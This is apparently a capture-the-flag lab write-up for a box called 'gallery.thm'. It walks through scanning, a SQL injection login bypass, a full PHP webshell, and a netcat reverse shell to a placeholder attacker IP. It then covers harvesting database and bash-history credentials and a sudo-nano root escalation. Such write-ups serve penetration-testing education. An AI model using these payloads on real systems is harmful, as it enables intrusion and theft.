# Enumeration

## \[+] 10.10.51.28 - gallery.thm

We will add the target IP address and a domain name to our `/etc/hosts` file. Using `sudo sh -c`, executes the entire command as a subshell as `root` where we will then use `echo` to create a new line with `\n` followed by our target IP and the domain name we give it.

```sh
sudo sh -c 'echo "\n10.10.51.28 gallery.thm" >> /etc/hosts'
```

Then `export` the IP address to the environment variable `RHOSTS` so I can use `$RHOSTS` instead of typing the IP address every time.

```sh
export RHOSTS=10.10.51.28
```

First I run a quick scan with [rustscan](https://github.com/RustScan/RustScan) and a longer [nmap](https://nmap.org/) stealth scan with `-Pn` mode enabled which will treat all hosts as online which helps find other hosts that block ICMP packets:

```sh
rustscan -a $RHOSTS --ulimit 5000 -b 4500 -t 2000 --range 1-65535 -- -sC -sV
sudo nmap -v -Pn -sS -p- -A --min-rate=1000 -T4 $RHOSTS -oN nmap.txt
```

## \[+] Port 80 - HTTP

Just a default Apache page, so let's try directory/file fuzzing using [feroxbuster](https://github.com/epi052/feroxbuster) with this [wordlist](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/raft-medium-directories.txt):

```sh
feroxbuster -u http://gallery.thm -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x json,txt,js,xml -s 200,301,302,403 -o p-80-www-ferox.txt
```

### \[-] gallery.thm/gallery/

Upon accessing this URL we get redirected to a login portal for "Simple Image Gallery System":

![017a64118dc13ed2ddd772d17778aba1.png](/resources/98a85a2d10344408bbe107c2cd13413b.png)

To inspect the website further, we can use a proxy tool like [Burp Suite](https://portswigger.net/burp) or [ZAP](zaproxy.org/) - I will be using ZAP.

Copy the URL and in ZAP, click on the "Quick Start" tab, select "Manual Explore", then paste the URL and click "Launch Browser":

![57fef7043aabc2015184a6512e5d68fd.png](/resources/3c5e8e39b26348e781bffcc45856256e.png)

When the login page loads, let's try to login as user "`test`" with the password "`test`" and see what the request/response looks like in ZAP:

![220b3a4479d4398c488c133d448cfc73.png](/resources/265ea55f5c5a4afcb4b8fe2738ca02fe.png)

The request is normal `POST` request with the `username` and `password` parameter:

![e55e5451ea5318def4582fd5cab751e8.png](/resources/ad0b4336c09a4d63b9933c91218b07c2.png)

But, the response shows our input is directly inserted into an SQL statement:

![c34b90b5455dbe887c8fddadefdef5e0.png](/resources/f63025d36f3c4fa89518afb91da0f4d7.png)

This means we can inject a malicious payload that will allow us to bypass the login. If we try the username: `admin' or '1'='1'#` with any password, we will be logged in as `admin`. We can see how this works by comparing our test response with the malicious one.

Original response:

```mysql
SELECT * from users where username = 'test' and password = md5('test')
```

Malicious reponse:

```mysql
SELECT * from users where username = 'admin' or '1'='1'#' and password = md5('test')
```

If you notice the syntax highlighting after the hash character (`#`) is different because that part of the SQL statement has been made a comment and is no longer a part of the statement. Now, the first part of the statement is only checking to see if our username is `admin` or if the number one is equal to one, which returns true and makes our statement true which allows us to log in without a password.

Now, let's try it on the login page by entering `admin' or '1'='1'#` as the username and anything or blank for the password, then click the "Sign In" button:

![af0621d64c55faca243d378d66a7e965.png](/resources/aff1816c2ff54dda9d76fe3b8c932196.png)

![476057eb6f87b0105e5f2025d1d6ec9d.png](/resources/df17c5a3ac2744329cb3c61c51213805.png)

# Initial Foothold

### \[-] gallery.thm/gallery/?page=user

This Gallery System has the ability to upload a custom image for the user's avatar. We can access this feature by clicking on the drop down arrow next to "Administrator Admin", then click on the "My Account" button:

![f03ea425ea5aa326388646305a78cf32.png](/resources/17f5876de30647369c301cddf748464a.png)

The upload function does not filter the filetypes and allows any kind of file to be uploaded. We will be using this basic PHP webshell:

```php
<HTML><BODY>
<FORM METHOD="GET" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="x">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
<pre>
<?php
if($_REQUEST['x']) {
  system($_REQUEST['x']);
  } else phpinfo();
?>
</pre>
</BODY></HTML>
```

Save the above code to a text file named "`webshell.php`" then upload it:

![0cf98fafcb18624cad92c29dcb272bdf.png](/resources/4b64f6278e8a4a40a6a17032ae7ced95.png)

After the file has been uploaded, we can navigate to the URL `http://gallery.thm/gallery/uploads/` where our webshell will be renamed as `XXXXXXXXXX_webshell.php`:

![3ad1e341f2409d253e6e48bda2eaae23.png](/resources/975a5c2db447442ea357eaeb1ed59da2.png)

### \[-] www-data\@gallery

To get a reverse shell, we will first start our [Netcat](https://linux.die.net/man/1/nc) listener on our attacking machine:

```sh
nc -nvlp 4444
```

Then on the webshell we send the command:

```sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <ATTACKER_IP> 4444 >/tmp/f
```

![00b572fc0210c3c91fff7f93d94cc93f.png](/resources/9e941a2b11be44e09a674976c2de8b20.png)

After pressing the "Send" button, we check back to our Netcat listener for the connection from the victim machine:

![f3ad9082e9d82396e45cc0669bc39aea.png](/resources/0360cb1588b7470f85ae65250c807d9c.png)

Let's stablize the shell we just got by doing the following steps:

1. `python3 -c 'import pty;pty.spawn("/bin/bash")'` ... Use Python to spawn a stable shell
2. `CTRL + Z` ... Backgrounds the current shell
3. `stty raw -echo;fg` ... Fixes echoing and foregrounds the shell
4. `export TERM=xterm-256color` ... Sets terminal to xterm

Checking the `/var/www/html/gallery/initialize.php` file reveals some credentials:

```sh
cat /var/www/html/gallery/initialize.php
```

![ebd1aabea56e6b9c300acdb4b334bf35.png](/resources/0f801217c109476f8490ac1569b293fa.png)

The credentials for `gallery_user` seems to be for an SQL database hosted on the same machine. Let's try to access it by using the following command and enter the password when prompted:

```sh
mysql -h localhost -D gallery_db -u gallery_user -p
```

After entering the command, we will be in the MariaDB command-line interface:

![db6abf47380f7082270aca521b0d9373.png](/resources/34f6c411833b4fae8d02fbf30e10497d.png)

Let's start enumerating the database by listing the available tables using the command `show tables;`:

![ad53529d28f1fab8baec2ea8ce494c6b.png](/resources/c0fd4042cf494a2397e383bc5990c571.png)

Then dump all the information from the `users` table by using the command `select * from users;` where we will find the password for the user `admin`:

![a6de6312832fab209b64cc5b37c14b34.png](/resources/658e0c29e1c644fc8ed2daefe320a00f.png)

# Privilege Escalation

### \[-] mike\@gallery

After some enumeration, we will find a directory named "`/var/backups/mike_home_backup/`. We can use the ls command with the `-lah` flags; `l` is for long listing format which will include extra details, `a` will include hidden filenames that start with `.`, and `h` makes the output easier to read:

```sh
cd /var/backups/mike_home_backup/
ls -lah
```

![cb65fb850c8bb02e34524746a65406f9.png](/resources/9dcb2b7cccfe46fc936b0bb72ab1180e.png)

Usually, the `.bash_history` file is cleared out, but this one has a file size of 135 bytes. This file is a log of all bash commands that were run. Let's check the contents using `cat`:

```sh
cat .bash_history
```

![b878751c0902184569a93e5413235c42.png](/resources/6c2f8ca8002344ae87b7f1c88b37b602.png)

In the above screenshot, the user attempted to check their [sudo](https://linux.die.net/man/8/sudo) privileges using the `-l` flag, but did not include a space between the command and their password which ended up being recorded in the `.bash_history` file.

Now, we can use the [su](https://linux.die.net/man/1/su) command and switch to the user `mike` and enter the password when prompted:

```sh
su mike
```

![9f3b5c00e3c3335370e09d6441cafb33.png](/resources/53ec9c48f9a4400bba9ead7661878401.png)

We can find the user flag in `/home/mike/user.txt`:

```sh
cd /home/mike/
ls -lah
cat user.txt
```

![e9ff4d575d5255f31d9723941fee3b0d.png](/resources/04b17491d2334c33ac3c9dd1be6e9d97.png)

### \[-] root\@gallery

Let's check the sudo privileges using `sudo -l`:

![7bd5a024a28fa8902b5fe0a6f504bd0f.png](/resources/6f52ad06cf964e1e9bd4293775e5aa23.png)

We can run the `rootkit.sh` script in the `/opt/` directory using `/bin/bash` as root. Checking the privileges for the script using `ls -lah rootkit` shows we don't have any way to edit it either:

![62d3f9d1c91fac2f72313324eb1f803e.png](/resources/5e2cd648a80c4ca8969e136084ff8ff1.png)

The script is used to control a binary `/usr/bin/rkhunter`:

```sh
cat /opt/rootkit.sh
```

![28282bff805b8299f48b6057c4a91b9f.png](/resources/c2e391c5da2346b59a378e738fe7fcbb.png)

The last option of the script - `read`, is using the `nano` text editor to open the file `/root/report.txt`. Nano has a built-in command-line function where we can execute shell commands within the text editor and since the root user is running the binary, we will be running commands as the root user as well.

To gain root access, we first run the script using `sudo /bin/bash /opt/rootkit.sh`. The script will prompt: "Would you like to versioncheck, update, list or read the report ?", enter `read` and the script will open Nano:

![9f128e22ce2694e34767af670f41db0f.png](/resources/61e819ad81e4473d9372de237a12cae0.png)

![fee5a062e536ad4bb0bd7a25a3103d5f.png](/resources/b67ab90e805a49daa7662aaa62f8152b.png)

Now, we press `CTRL+R` to enter "Read File" mode, then `CTRL+X` for the command line:

![845b73a04081c3c1abc4bbe769c5cc96.png](/resources/6c93b5c25029431cb25797e5e326b49a.png)

![6bf6cdf2ffadbbcd86e796003781e3b6.png](/resources/22ae729869a84452b31d27d0945d8f9d.png)

Then, enter the follow command to open a shell:

```sh
reset; sh 1>&0 2>&0
```

![8b1cf49a5e83022f09ab80147f58a22b.png](/resources/5c9975e53d6447ceb442d6f19cdc1f76.png)

The terminal will look a little messy, so enter the `clear` command to get a clean terminal:

![c9896f9eaac29834731c088088b56f88.png](/resources/9d15fddbf58344818a7597c4ac9ed4e1.png)

We can find the root flag in `/root/root.txt`:

```sh
cat /root/root.txt
```

![76c6497f07b2e9b6fc729052bd362454.png](/resources/48a4b451bf344b40962fb018e462152a.png)
